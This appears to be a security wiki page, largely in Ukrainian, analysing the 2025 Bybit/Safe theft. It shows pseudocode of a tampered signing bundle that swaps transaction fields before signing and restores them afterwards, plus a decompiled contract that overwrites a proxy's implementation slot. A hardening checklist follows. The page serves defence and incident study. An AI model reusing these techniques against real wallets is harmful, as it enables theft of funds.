# Компрометація Web3 Signing Workflow & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## Огляд

A cold-wallet theft chain combined a **supply-chain compromise of the Safe{Wallet} web UI** with an **on-chain delegatecall primitive that overwrote a proxy’s implementation pointer (slot 0)**. The key takeaways are:

- If a dApp can inject code into the signing path, it can make a signer produce a valid **EIP-712 signature over attacker-chosen fields** while restoring the original UI data so other signers remain unaware.
- Safe proxies store `masterCopy` (implementation) at **storage slot 0**. A delegatecall to a contract that writes to slot 0 effectively “upgrades” the Safe to attacker logic, yielding full control of the wallet.

## Off-chain: Targeted signing mutation in Safe{Wallet}

A tampered Safe bundle (`_app-*.js`) selectively attacked specific Safe + signer addresses. The injected logic executed right before the signing call:
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Властивості атаки
- **Context-gated**: жорстко вбудовані allowlists для постраждалих Safe/підписантів запобігали шуму та зменшували виявлення.
- **Last-moment mutation**: поля (`to`, `data`, `operation`, gas) були перезаписані безпосередньо перед `signTransaction`, потім відновлені, тож payloadи пропозицій в UI виглядали безпечними, тоді як підписи відповідали payloadу атакуючого.
- **EIP-712 opacity**: гаманці показували структуровані дані, але не декодували вкладений calldata і не відзначали `operation = delegatecall`, через що змінене повідомлення фактично було підписане всліпу.

### Актуальність валідації Gateway
Пропозиції Safe надсилаються до **Safe Client Gateway**. До запровадження жорсткіших перевірок шлюз міг прийняти пропозицію, де `safeTxHash`/підпис відповідали іншим полям, ніж ті, що в JSON тілі, якщо UI перезаписував їх після підпису. Після інциденту шлюз відхиляє пропозиції, хеш/підпис яких не відповідають надісланій транзакції. Подібну серверну верифікацію хешу слід застосовувати до будь-якого signing-orchestration API.

### 2025 Bybit/Safe incident highlights
- 21 лютого 2025 року з Bybit cold-wallet було вкрадено приблизно ~401k ETH, використавши ту ж схему: скомпрометований Safe S3 bundle спрацьовував лише для підписантів Bybit і змінював `operation=0` → `1`, вказуючи `to` на попередньо розгорнутий контракт атакуючого, який записує слот 0.
- Wayback-cached `_app-52c9031bfa03da47.js` показує, що логіка була прив’язана до Safe Bybit (`0x1db9…cf4`) та адрес підписантів, після чого негайно була відкотена до чистого bundle через дві хвилини після виконання, відтворюючи трюк «mutate → sign → restore».
- Зловмисний контракт (наприклад, `0x9622…c7242`) містив прості функції `sweepETH/sweepERC20` плюс `transfer(address,uint256)`, який записує implementation slot. Виконання `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` змінило реалізацію проксі і надало повний контроль.

## On-chain: Delegatecall proxy takeover via slot collision

Safe proxies keep `masterCopy` at **storage slot 0** and delegate all logic to it. Because Safe supports **`operation = 1` (delegatecall)**, any signed transaction can point to an arbitrary contract and execute its code in the proxy’s storage context.

An attacker contract mimicked an ERC-20 `transfer(address,uint256)` but instead wrote `_to` into slot 0:
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Execution path:
1. Жертви підписують `execTransaction` з `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe `masterCopy` перевіряє підписи над цими параметрами.
3. Proxy виконує delegatecall у `attackerContract`; тіло `transfer` записує slot 0.
4. Slot 0 (`masterCopy`) тепер вказує на логіку під контролем атакуючого → **повне захоплення гаманця та викачування коштів**.

### Guard & version notes (post-incident hardening)
- Safes >= v1.3.0 можуть встановити **Guard**, щоб ветувати `delegatecall` або застосовувати ACL на `to`/селектори; Bybit працював на v1.1.1, тож Guard hook не існував. Оновлення контрактів (і повторне додавання власників) необхідне, щоб отримати цю контрольну площину.

## Detection & hardening checklist

- **UI integrity**: закріплюйте JS assets / SRI; моніторте bundle diffs; розглядайте signing UI як частину межі довіри.
- **Sign-time validation**: апаратні гаманці з **EIP-712 clear-signing**; явно відображайте `operation` і декодуйте вкладений calldata. Відмовляйтеся від підпису коли `operation = 1`, якщо політика цього не дозволяє.
- **Server-side hash checks**: шлюзи/сервіси, що ретранслюють пропозиції, повинні перераховувати `safeTxHash` і перевіряти, що підписи відповідають поданим полям.
- **Policy/allowlists**: правила preflight для `to`, селекторів, типів активів, і заборона `delegatecall`, окрім перевірених потоків. Вимагайте внутрішній сервіс політик перед трансляцією повністю підписаних транзакцій.
- **Contract design**: уникайте відкриття довільного `delegatecall` у multisig/treasury wallets, якщо це не строго необхідно. Розміщуйте вказівники на апгрейд подалі від slot 0 або захищайте їх явною логікою апгрейду та контролем доступу.
- **Monitoring**: сповіщайте про виконання `delegatecall` з гаманців, які містять кошти скарбниці, та про пропозиції, які змінюють `operation` від типових патернів `call`.

## References

- [AnChain.AI forensic breakdown of the Bybit Safe exploit](https://www.anchain.ai/blog/bybit)
- [Zero Hour Technology analysis of the Safe bundle compromise](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
